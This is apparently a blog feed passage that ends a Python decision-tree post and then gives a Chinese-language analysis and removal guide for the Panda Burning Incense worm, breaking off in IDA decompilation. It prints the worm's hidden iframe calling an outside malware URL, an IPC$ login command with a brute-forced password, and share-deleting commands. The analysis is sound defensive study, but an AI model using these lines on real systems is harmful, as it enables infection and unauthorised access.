self.tree</span><br><span class="line">            <span class="keyword">while</span> predictDict != <span class="string">&#x27;是&#x27;</span> <span class="keyword">and</span> predictDict != <span class="string">&#x27;否&#x27;</span>:</span><br><span class="line">                col = <span class="built_in">list</span>(predictDict.keys())[<span class="number">0</span>]</span><br><span class="line">                predictDict = predictDict[col]</span><br><span class="line">                <span class="keyword">if</span> x[i][col] <span class="keyword">not</span> <span class="keyword">in</span> predictDict.keys():</span><br><span class="line">                    predictDict = predictDict[<span class="string">&#x27;非&#x27;</span>+self.lst[j]]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    predictDict = predictDict[x[i][col]]</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y[i] = predictDict</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x, y, signal = CreateData()</span><br><span class="line">    x = DataProcessing(x, signal)</span><br><span class="line">    dt = DecisionTree()</span><br><span class="line">    dt.fit(x, y)</span><br><span class="line">    <span class="built_in">print</span>(dt.tree)</span><br><span class="line">    <span class="built_in">print</span>(dt.predict(x))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CART算法是二叉决策树。本来这个算法难得我想放弃，copy某位博主的代码修改修改就交上去的。结果越改越多，最后除了核心算法没改，整个框架结构都被我改了。被我修改得看起来貌似有点累赘，但好像也是必要的。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>熊猫烧香病毒的行为机理分析</title>
    <link href="http://example.com/posts/a48809a5.html"/>
    <id>http://example.com/posts/a48809a5.html</id>
    <published>2022-05-28T06:59:44.232Z</published>
    <updated>2022-06-30T06:04:36.015Z</updated>
    
    <content type="html"><![CDATA[<p>熊猫烧香是Windows PE病毒，属于捆绑释放型。具体有关PE病毒的知识参照我写的另一篇笔记 <a href="https://v5le0n9.github.io/posts/adc1352a.html">Windows PE病毒分类及感染方式</a> 。</p><p>熊猫烧香是一款非常具有代表性的病毒，当年造成了非常大的影响，并且也有一定的技术手段。用它来入门恶意样本分析是非常适合的，所以就拿它来开刀了。</p><span id="more"></span><h1 id="1-熊猫烧香的前因后果"><a href="#1-熊猫烧香的前因后果" class="headerlink" title="1. 熊猫烧香的前因后果"></a>1. 熊猫烧香的前因后果</h1><p>熊猫烧香(Worm.WhBoy)是一款拥有自动传播、自动感染硬盘能力和强大的破坏能力的病毒，它不但不能感染系统中的EXE、COM、PIF、SRC、HTML、ASP等文件，还能中止大量的反病毒软件进程，并且会删除扩展名为gho的文件，是系统备份工具GHOST的备份文件。被感染的用户系统中所有EXE文件的图标全部被改成熊猫烧香。</p><p>2006年10月16日由25岁的湖北武汉李俊编写，2007年1月初肆虐网络，主要通过下载的文件传染传播。</p><p>熊猫烧香的破坏力远大于其技术含量，尤其是对网络信息安全产生深远的影响，毕竟它是第一个让中国普通用户对木马病毒有所认识和感知的。从现在的技术角度看，熊猫烧香病毒技术水平一般，但病毒作者在当时运用的各类技术手法还是值得参考和借鉴的。</p><ul><li>首先它可以感染EXE文件，也可以将扩展名为gho的文件删除</li><li>其次是将源病毒感染到Web文件，使网页成为它传播的介质</li><li>然后在传播层面，病毒作者使用众多传播途径</li><li>最后是具备一定的对抗杀软能力</li></ul><p>熊猫病毒如果是放在现在，这些基本都是所有病毒木马常见、必备的技术，但技术不可同日而语。随着人工智能、大数据、云计算、区块链等先进技术不断发展，病毒作者也将这些技术手段运用到各类安全攻击中危害用户。典型的包括：</p><ul><li>勒索病毒：在2017年5月12日，一款名为WannaCry勒索病毒通过MS17-010漏洞在全球范围大爆发，感染了大量计算机。此后，Petya、Bad Rabbit、Globelmposter等勒索病毒相继对企业及机构发起攻击。</li><li>挖矿木马：伴随着比特币等虚拟数字货币交易火爆的同时，越来越多的人利用数字虚拟币交易大发横财，吸引大量黑产从业人员进入挖矿产业，这也是为什么2017年之后披露的挖矿木马攻击事件数量呈现出爆发式的增长。</li><li>APT攻击：当前鱼叉攻击、水坑攻击、远程可执行漏洞和密码爆破攻击等手段依然是APT攻击的最主要方式。未来，Fileless攻击、将通信的C&amp;C服务器存放在公开的社交网站上、使用公开或者开源工具、多平台攻击和跨平台攻击将成APT攻击技术的主要发展趋势。</li><li>IoT攻击：黑客通常通过设备弱口令或者远程命令执行漏洞对IoT设备进行攻击，攻击者通过蠕虫感染或者自主的批量攻击来控制批量目标设备，构建僵尸网络，IoT设备成为了黑客最新热爱的武器。</li></ul><p>除此之外，供应链攻击、AI对抗样本、视频语音欺骗等攻击延伸都是未来黑客技术的发展趋势，这些都应该引起我们足够的重视。</p><h1 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2. 样本行为分析"></a>2. 样本行为分析</h1><p>熊猫烧香有它的特殊性，也有它的通用性。</p><h2 id="2-1-自启动方式"><a href="#2-1-自启动方式" class="headerlink" title="2.1 自启动方式"></a>2.1 自启动方式</h2><ul><li><p>熊猫烧香病毒将自身拷贝至系统目录，同时修改注册表将自身设置为开机启动项。</p><p>这种方式也是绝大部分病毒自启动所采用的方式。</p></li><li><p>拷贝自身到所有驱动器根目录(盘符)，命名为<code>setup.exe</code>，在驱动器根目录生成<code>autorun.inf</code>文件，并把它设置为隐藏、只读、系统。</p><p><code>autorun.inf</code>文件的作用是允许在双击磁盘时自动运行指定的某个文件，即运行<code>setup.exe</code>。</p></li></ul><p>注意，该<code>setup.exe</code>文件被设置为隐藏、只读、系统，虽然我们可以查看“隐藏的项目”，但某些隐藏的系统文件仍然是看不到的。</p><img src="/posts/a48809a5/2.1.1.png" class="" title="隐藏的项目"><p>我们需要进一步设置，取消勾选“隐藏保护的操作系统文件”，才能显示这类文件，如下图所示。而通常设置为隐藏的系统文件是较难被觉察的，尤其当这类文件被写入到某个指定的操作系统目录中，防不胜防。</p><img src="/posts/a48809a5/2.1.2.png" class="" title="隐藏的系统文件"><h2 id="2-2-感染与传播方式"><a href="#2-2-感染与传播方式" class="headerlink" title="2.2 感染与传播方式"></a>2.2 感染与传播方式</h2><ul><li><p>感染可执行文件</p><p>熊猫烧香病毒会搜索并感染系统中特定目录外的所有EXE / SCR / PIF / COM等文件，将自身捆绑在被感染文件前端，并在尾部添加标记信息：<code>.WhBoy&#123;原文件名&#125;.exe.&#123;原文件大小&#125;</code>。注意，它感染的是特定目录外的，而某些系统目录是不去感染的，因为Windows系统某些可执行文件是有还原机制的，系统文件修改有时候会有报警提示。</p></li><li><p>感染网页</p><p>熊猫烧香病毒会查找系统以<code>.html</code>和<code>.asp</code>为后缀的文件，在里面插入网页标记，这个帧iframe会将另外一个URL嵌入到当前网页，并且宽度和高度设置为0（看不到）。嵌入页面后会利用如IE浏览器的漏洞来触发恶意代码，从而释放相应病毒出来。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.ac86.cn/66/index.htm</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>通过弱口令传播</p><p>这种传播方式非常普遍，它会访问局域网共享文件夹将病毒文件拷贝到该目录下，并改名为<code>GameSetup.exe</code>（模拟游戏名称）；通过弱口令猜测从而进入系统C盘。</p></li></ul><h2 id="2-3-自我隐藏"><a href="#2-3-自我隐藏" class="headerlink" title="2.3 自我隐藏"></a>2.3 自我隐藏</h2><ul><li><p>禁用安全软件</p><p>熊猫烧香病毒会尝试关闭安全软件（杀毒软件、防火墙、安全工具）的窗口、进程，比如包含360的名称等；删除注册表中安全软件的启动项；禁用安全软件的服务等操作。</p></li><li><p>自动恢复“显示所有文件和文件夹”选项隐藏功能</p><p>某些用户去看隐藏文件，会主动点击查看隐藏文件夹，但这个病毒会自动恢复隐藏。</p></li><li><p>删除系统的隐藏共享（net share）</p><p>Windows系统其实默认会开启隐藏共享 C$ ，比如早期的 IPC$ 管道等，通过net share命令可以删除隐藏共享。</p></li></ul><p>在未经授权的情况下很难将木马拷贝到别人的电脑上，这里需要利用 IPC$ 漏洞，调用445端口号实现。445端口中有个 IPC$  ，称之为空连接，没有固定文件夹的共享；而 C$ 、D$ 、E$ 代表分区共享，是有固定文件夹的。换句话说，445端口打开就相当于我们可以在局域网中轻松访问各种共享文件夹，如果您的电脑是弱密码，很容易就被攻破，这里使用 IPC$ 暴力爆破。</p><p>IPC$ (Internet Process Connection) 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。IPC$ 是NT2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。NT2000在提供了 IPC$ 功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$ 、D$ 、E$、…)和系统目录(C:\windows)共享。所有的这些初衷都是为了方便管理员的管理，但好的初衷并不一定有好的收效，一些别有用心者会利用IPC$访问共享资源，导出用户列表，并使用一些字典工具，进行密码探测。</p><p>下图展示了使用NTscan软件暴力爆破，该软件支持远程连接 IPC$ 和利用字典文件。运行软件，输入IP地址“10.1.1.2”，选择IPCscan连接共享“IPC$”，成功获取了密码“123.com”。</p><img src="/posts/a48809a5/2.3.1.png" class="" title="NTScan暴力破解"><p>接着与目标主机建立 IPC$ 空连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.1.2\ipc$ 123.com /user:administrator</span><br></pre></td></tr></table></figure><h2 id="2-4-破坏功能"><a href="#2-4-破坏功能" class="headerlink" title="2.4 破坏功能"></a>2.4 破坏功能</h2><ul><li><p>熊猫烧香病毒同时会开另一个线程连接某网站下载DDOS程序进行发动恶意攻击</p><p>具有破坏功能，可开启附件攻击行为，熊猫烧香感染计算机台数非常多，它就能发动多台电脑发起DDOS攻击。</p></li><li><p>删除扩展名为gho的文件，延长存活时间</p><p>该文件是系统备份工具GHOST的备份文件，从而使用户的系统备份文件丢失。当用户中了病毒，想去恢复时就存在困难了。</p></li></ul><p>这就是一个典型的病毒案例，现在很多病毒功能都具有相似性，它们有经济利益趋势。当然对于不同的病毒来说，如果它们的目的不一样，其行为会存在很大差异。熊猫烧香病毒的隐蔽性不是很好，每一个感染者都会知道自己已被感染。</p><h1 id="3-样本运行及查杀防御"><a href="#3-样本运行及查杀防御" class="headerlink" title="3. 样本运行及查杀防御"></a>3. 样本运行及查杀防御</h1><p>手动查杀病毒基本流程如下：</p><ul><li><p>排查可疑进程</p><p>因为病毒往往会创建出来一个或者多个进程，因此需要分辨出哪些进程是由病毒所创建，然后删除可疑进程。</p></li><li><p>检查启动项</p><p>病毒为了实现自启动，会采用一些方法将自己添加到启动项中，从而实现自启动，所以我们需要把启动项中的病毒清除。</p></li><li><p>删除病毒</p><p>在上一步的检查启动项中，我们就能够确定病毒主体的位置，这样就可以顺藤摸瓜，从根本上删除病毒文件。</p></li><li><p>修复被病毒破坏的文件</p><p>这一步一般来说无法直接通过纯手工完成，需利用相应的软件，不是我们讨论的重点。</p></li></ul><p>为什么计算机中安装了杀毒软件，还要去手动查杀呢？</p><p>因为杀毒软件存在严重的滞后性，必须要等病毒工程师抓取对应样本，并进行分析总结病毒的特征码，再加入杀软病毒库后才能识别病毒，但病毒会存在各种变种，因此手动查杀也是必要的。同时，这对反病毒工程师来说也是认识和熟悉病毒的过程，在技术上是非常必要的。这也是现在为什么很多云沙箱、云杀软、动态更新的技术不断出现。</p><h2 id="3-1-排查可疑进程"><a href="#3-1-排查可疑进程" class="headerlink" title="3.1 排查可疑进程"></a>3.1 排查可疑进程</h2><p>运行病毒前打开任务管理器观察此时打开的进程。</p><img src="/posts/a48809a5/3.1.1.png" class="" title="当前任务管理器进程"><img src="/posts/a48809a5/3.1.2.png" class="" title="当前任务管理器进程"><p>运行熊猫烧香样本，可以发现任务管理器就自动关闭，并且无法再次打开（总一闪而过）。那么，我们怎么查看系统中的进程呢？打开CMD命令提示符，输入命令“tasklist”查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [版本 6.1.7601]</span><br><span class="line">版权所有 (c) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Leong&gt;tasklist</span><br><span class="line"></span><br><span class="line">映像名称                       PID 会话名              会话#       内存使用</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0         24 K</span><br><span class="line">System                           4 Services                   0        612 K</span><br><span class="line">smss.exe                       244 Services                   0        796 K</span><br><span class="line">csrss.exe                      332 Services                   0      4,228 K</span><br><span class="line">csrss.exe                      384 Console                    1     19,856 K</span><br><span class="line">wininit.exe                    392 Services                   0      3,904 K</span><br><span class="line">winlogon.exe                   428 Console                    1      5,748 K</span><br><span class="line">services.exe                   488 Services                   0      7,028 K</span><br><span class="line">lsass.exe                      496 Services                   0      7,744 K</span><br><span class="line">lsm.exe                        512 Services                   0      4,508 K</span><br><span class="line">svchost.exe                    596 Services                   0      7,060 K</span><br><span class="line">svchost.exe                    672 Services                   0      6,208 K</span><br><span class="line">svchost.exe                    764 Services                   0     13,072 K</span><br><span class="line">svchost.exe                    808 Services                   0      8,620 K</span><br><span class="line">svchost.exe                    840 Services                   0     26,444 K</span><br><span class="line">svchost.exe                    980 Services                   0     10,328 K</span><br><span class="line">svchost.exe                   1048 Services                   0     12,412 K</span><br><span class="line">spoolsv.exe                   1200 Services                   0      8,544 K</span><br><span class="line">svchost.exe                   1228 Services                   0     10,708 K</span><br><span class="line">httpd.exe                     1332 Services                   0     17,104 K</span><br><span class="line">VGAuthService.exe             1444 Services                   0      7,248 K</span><br><span class="line">taskhost.exe                  1548 Console                    1      7,620 K</span><br><span class="line">dwm.exe                       1604 Console                    1     58,972 K</span><br><span class="line">explorer.exe                  1612 Console                    1     57,228 K</span><br><span class="line">httpd.exe                     1740 Services                   0     17,272 K</span><br><span class="line">vmtoolsd.exe                  1792 Services                   0     15,804 K</span><br><span class="line">svchost.exe                   1432 Services                   0      4,768 K</span><br><span class="line">vm3dservice.exe               1496 Console                    1      3,664 K</span><br><span class="line">vmtoolsd.exe                  1480 Console                    1     20,996 K</span><br><span class="line">jusched.exe                   2140 Console                    1      4,040 K</span><br><span class="line">ApacheMonitor.exe             2224 Console                    1      3,584 K</span><br><span class="line">dllhost.exe                   2244 Services                   0      8,788 K</span><br><span class="line">msdtc.exe                     2408 Services                   0      6,272 K</span><br><span class="line">WmiPrvSE.exe                  2660 Services                   0     11,264 K</span><br><span class="line">SearchIndexer.exe             2692 Services                   0     34,036 K</span><br><span class="line">svchost.exe                   3296 Services                   0      3,712 K</span><br><span class="line">sppsvc.exe                    3332 Services                   0      7,360 K</span><br><span class="line">svchost.exe                   3368 Services                   0      6,296 K</span><br><span class="line">audiodg.exe                   2384 Services                   0     14,140 K</span><br><span class="line">SearchProtocolHost.exe        3744 Services                   0      6,240 K</span><br><span class="line">SearchFilterHost.exe          4084 Services                   0      4,204 K</span><br><span class="line">spoclsv.exe                   2268 Console                    1      5,960 K</span><br><span class="line">cmd.exe                       3252 Console                    1      2,640 K</span><br><span class="line">conhost.exe                   2348 Console                    1      6,880 K</span><br><span class="line">tasklist.exe                  2968 Console                    1      4,492 K</span><br></pre></td></tr></table></figure><p>重点关注会话值为1的进程，发现<code>spoclsv.exe</code>、<code>cmd.exe</code>、<code>conhost.exe</code>、<code>tasklist.exe</code>都没出现过。<code>cmd.exe</code>和<code>tasklist.exe</code>都是我们操作过的命令，可以不管。百度<code>conhost.exe</code>是命令行程序的宿主进程，非病毒木马；<code>spoclsv.exe</code>是熊猫烧香病毒相关程序。</p><p>输入以下命令强制结束进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /im 2268#强制结束PID为2268的进程</span><br></pre></td></tr></table></figure><p>其中“/f”表示强制执行，“/im”表示文件镜像，“2268”对应PID值。注意，使用普通用户执行命令不能结束该进程，需使用管理员权限。</p><img src="/posts/a48809a5/3.1.3.png" class="" title="终止spoclsv.exe"><p>此时，任务管理器又可以打开了。</p><h2 id="3-2-检查启动项"><a href="#3-2-检查启动项" class="headerlink" title="3.2 检查启动项"></a>3.2 检查启动项</h2><p>排查可疑进程之后，接下来查询启动项，徽标键 + R -&gt; 输入msconfig。显示如下图所示，可以看到“svcshare”启动项。命令为<code>C:\WINDOWS\System32\drivers\spoclsv.exe</code>，位置在<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>。</p><img src="/posts/a48809a5/3.2.1.png" class="" title="样本启动项"><p>徽标键 + R -&gt; 输入regedit，打开注册表。在注册表搜索“svcshare”找到了它，也就是说这个病毒也会写进注册表里，启动对应的EXE程序。</p><img src="/posts/a48809a5/3.2.2.png" class="" title="写入注册表"><p>先将病毒的启动项取消，回到系统配置中取消勾选“svcshare”启动项，暂不重新启动计算机。</p><img src="/posts/a48809a5/3.2.4.png" class="" title="写入注册表"><p>回到注册表中看，病毒写入注册表的信息已经消失了，说明启动项已经成功被删除。</p><img src="/posts/a48809a5/3.2.5.png" class="" title="写入注册表"><h2 id="3-3-删除病毒"><a href="#3-3-删除病毒" class="headerlink" title="3.3 删除病毒"></a>3.3 删除病毒</h2><p>对于病毒程序，我们要使用强制删除。同样，用管理员权限打开命令窗口，进入到病毒所在目录，执行以下命令强制删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del /f spoclsv.exe</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/3.3.1.png" class="" title="强制删除病毒"><p>但这还没有结束，该病毒还将自身复制到每一个磁盘的根目录下。在C盘根目录下查看隐藏、只读、系统文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /ah</span><br></pre></td></tr></table></figure><p>根据样本行为分析中的自启动方式看，<code>autorun.inf</code>和<code>setup.exe</code>都是这个病毒带过来的。所以要将它们强制删除。</p><img src="/posts/a48809a5/3.3.2.png" class="" title="强制删除病毒"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del /ah /f antorun.inf</span><br><span class="line">del /ah /f setup.exe</span><br></pre></td></tr></table></figure><p>注意，是每一个磁盘都要删除<code>autorun.inf</code>和<code>setup.exe</code>。</p><img src="/posts/a48809a5/3.3.3.png" class="" title="强制删除病毒"><p>重启系统后，所有手动查杀病毒的工作完毕，我们的系统就又恢复正常了。</p><h1 id="4-Procmon检测病毒行为"><a href="#4-Procmon检测病毒行为" class="headerlink" title="4. Procmon检测病毒行为"></a>4. Procmon检测病毒行为</h1><h2 id="4-1-软件介绍"><a href="#4-1-软件介绍" class="headerlink" title="4.1 软件介绍"></a>4.1 软件介绍</h2><p>Process Monitor是微软推荐的一款系统监视工具，能够实时显示文件系统、注册表（读写）、网络连接与进程活动的高级工具。它整合了旧的Sysinternals工具、Filemon与Regmon，其中Filemon专门用来监视系统中的任何文件操作过程，Regmon用来监视注册表的读写操作过程。同时，Process Monitor增加了进程ID、用户、进程可靠度等监视项，可以记录到文件中。</p><p>总的来说，Process Monitor可以帮助使用者对系统中的任何文件、注册表操作进行监视和记录，通过注册表和文件读写的变化，有效帮助诊断系统故障或发现恶意软件、病毒及木马。</p><img src="/posts/a48809a5/4.1.1.png" class="" title="Procmon界面"><h2 id="4-2-病毒行为检测"><a href="#4-2-病毒行为检测" class="headerlink" title="4.2 病毒行为检测"></a>4.2 病毒行为检测</h2><p>打开Procmon，Filter -&gt; Filter(快捷键Ctrl + L)，添加过滤病毒名称<code>setup.exe</code>。</p><img src="/posts/a48809a5/4.2.1.png" class="" title="添加过滤病毒"><p>运行熊猫烧香<code>setup.exe</code>，可以看到Procmon捕获了非常多的病毒信息。</p><img src="/posts/a48809a5/4.2.2.png" class="" title="捕获病毒行为"><p>Tools -&gt; Process Tree(快捷键Ctrl + T)，查看病毒的进程树。</p><img src="/posts/a48809a5/4.2.3.png" class="" title="查看病毒进程树"><p>可以看到<code>setup.exe</code>的熊猫烧香病毒程序，并衍生出一个<code>spoclsv.exe</code>程序。位置信息为：<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>。</p><p>发现<code>spoclsv.exe</code>程序两次打开cmd，运行“net share”命令删除各个磁盘共享及系统根目录共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share C$ /del /y#删除C盘下的默认共享</span><br><span class="line">net share admin$ /del /y#删除C:\WINDOWS远程管理</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/4.2.4.png" class="" title="删除磁盘共享和根目录共享"><p>回到Procmon继续深入分析，关闭其它结果，只剩下注册表行为。</p><img src="/posts/a48809a5/4.2.5.png" class="" title="只显示注册表行为"><p>接着在过滤器中仅筛选对注册表修改的值，如下图所示。</p><img src="/posts/a48809a5/4.2.6.png" class="" title="筛选对注册表的修改"><img src="/posts/a48809a5/4.2.7.png" class="" title="筛选对注册表的修改"><p>主要修改的是Seed项，就是随机数种子的生成。但仅仅通过这个信息无法推测注册表的行为，所以该病毒对注册表并没有造成什么实质性影响。</p><p>在过滤器中删除注册表的修改，然后检测熊猫烧香病毒是否创建文件，创建文件也是病毒的重要手段。</p><img src="/posts/a48809a5/4.2.8.png" class="" title="筛选创建文件"><p>可以看到主要创建的文件是<code>C:\WINDOWS\system32\drivers</code>目录下，其它并没有特别的东西。所以<code>setup.exe</code>程序对我们的系统并没有实质性影响，主要影响还是<code>spoclsv.exe</code>程序，所以下一步操作就是监控<code>spoclsv.exe</code>程序。</p><img src="/posts/a48809a5/4.2.9.png" class="" title="监控spoclsv.exe"><p>重置过滤器，设置对<code>spoclsv.exe</code>程序的监控。在过滤器中查看<code>spoclsv.exe</code>删除注册表选项。</p><img src="/posts/a48809a5/4.2.10.png" class="" title="筛选删除注册表"><img src="/posts/a48809a5/4.2.11.png" class="" title="筛选删除注册表"><p>从这些名称可以看出它们都是常用的杀毒软件名称，其位置是CurrentVersion的Run下面，也就是将杀毒软件的自启动项全部删除。</p><p>在过滤器中查看<code>spoclsv.exe</code>创建及设置的注册表键值。</p><img src="/posts/a48809a5/4.2.12.png" class=""><p>显示结果如下图所示，病毒设置了自启动项，要启动的本体是drivers目录下的<code>spoclsv.exe</code>。继续查看，发现它对文件实现隐藏，设置该值后，即使我们在文件夹选项中选择显示所有文件和文件夹，也无法显示隐藏文件。</p><img src="/posts/a48809a5/4.2.13.png" class="" title="设置自启动项和实现文件隐藏"><p>只显示<code>spoclsv.exe</code>的文件系统行为。</p><p>熊猫烧香病毒创建文件包括：</p><ul><li>在<code>C:\WINDOWS\system32\drivers</code>中创建<code>spoclsv.exe</code></li><li>磁盘根目录创建<code>setup.exe</code>与<code>autorun.inf</code></li><li>某些目录中创建<code>Desktop_.ini</code>文件</li></ul><img src="/posts/a48809a5/4.2.14.png" class="" title="监控文件系统行为"><p>由于创建这些文件之后就对注册表的SHOWALL项进行了设置，使得隐藏文件无法显示，那么有理由相信，所创建出来的这些文件的属性都是“隐藏”的。</p><p>查看<code>spoclsv.exe</code>的网络行为。从监控结果可以看到，病毒会向局域网发送并接收信息，并不断尝试向外进行连接和发送数据包。</p><img src="/posts/a48809a5/4.2.14.png" class="" title="监控网络行为"><p>综上所述，可以总结熊猫烧香的几个行为：</p><ol><li>在<code>C:\WINDOWS\system32\drivers</code>目录创建<code>spoclsv.exe</code>程序</li><li>命令行模式下使用“net share”解除共享功能</li><li>删除安全类软件在注册表中自启动项</li><li>在注册表<code>CurrentVersion\Run</code>创建<code>svcshare</code>自启动项，每次开机时会自动运行病毒</li><li>禁用文件夹隐藏选项，修改注册表使得隐藏文件无法通过普通设置显示，从而隐藏病毒自身</li><li>将自身拷贝到每个磁盘的根目录下并命名为<code>setup.exe</code>，创建<code>autorun.inf</code>用于病毒的启动，这两个文件的属性都是“隐藏”。同时，会创建<code>Desktop_.ini</code>隐藏文件</li><li>向局域网发送并接收信息，并不断尝试向外进行连接和发送数据包</li></ol><p>我们已经基本分析了熊猫烧香的病毒行为，但这些行为仍然无法彻底了解病毒的行为，还需要通过OllyDbg逆向分析和IDA静态分析来实现。同时，熊猫烧香病毒还有一些其他的行为，包括：</p><ul><li>感染EXE文件，病毒会搜索并感染系统中特定目录外的所有EXE/SCR/PIF/COM文件，并将EXE执行文件的图标改为熊猫烧香的图标。</li><li>试图用以弱口令访问局域网共享文件夹，如果发现弱口令共享，就将病毒文件拷贝到该目录下，并改名为<code>GameSetup.exe</code>，以达到通过局域网传播的功能。</li><li>查找系统以<code>.html</code>和<code>.asp</code>为后缀的文件并在里面插入iframe，该网页中包含在病毒程序，一旦用户使用了未安装补丁的IE浏览器访问该网页就可能感染该病毒。</li><li>删除扩展名为gho的文件，该文件是系统备份工具GHOST的备份文件，这样可使用户的系统备份文件丢失。</li></ul><h1 id="5-动静结合分析样本——病毒初始化"><a href="#5-动静结合分析样本——病毒初始化" class="headerlink" title="5. 动静结合分析样本——病毒初始化"></a>5. 动静结合分析样本——病毒初始化</h1><p>栈上给局部变量分配空间的时候，栈是向下增长的，而栈上的数组、字符串、结构体等却是向上增长的。理解这一点可以帮助识别栈上的变量。</p><p>在分析病毒之前，首先需要调用工具检查病毒是否带壳，如果带壳还需要先进行脱壳操作。程序无壳，采用Borland Delphi 6.0-7.0编写的32位EXE文件。</p><img src="/posts/a48809a5/5.1.1.png" class="" title="查壳"><p>先将样本载入IDA，查看伪代码。</p><img src="/posts/a48809a5/5.1.2.png" class="" title="主函数伪代码"><img src="/posts/a48809a5/5.1.3.png" class="" title="主函数伪代码"><p>由于我第一次分析样本，所以这个样本我会事无巨细地分析，看看我能分析到什么程度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br></pre></td></tr></table></figure><p>样本主函数的第1行代码，<code>__noreturn</code>关键字，顾名思义，不返回，表明调用完成后函数不返回主调函数。注意，这与 void 返回类型不同。void 类型的函数在执行完毕后返回主调函数，只是它不提供返回值。这太容易理解了，因为<code>start()</code>本身就是主调函数，还能返回到哪里去？</p><p>第17行代码的<code>sub_40CA98()</code>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_40CA98</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6, <span class="type">int</span> a7, <span class="type">int</span> a8, <span class="type">int</span> a9, <span class="type">int</span> a10, <span class="type">int</span> a11, <span class="type">int</span> a12, <span class="type">int</span> a13, <span class="type">int</span> a14, <span class="type">int</span> a15, <span class="type">int</span> a16)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr[<span class="number">2</span>]; <span class="comment">// [sp+0h] [bp+0h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> MK_FP(retaddr[<span class="number">0</span>], retaddr[<span class="number">0</span>])(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16);</span><br><span 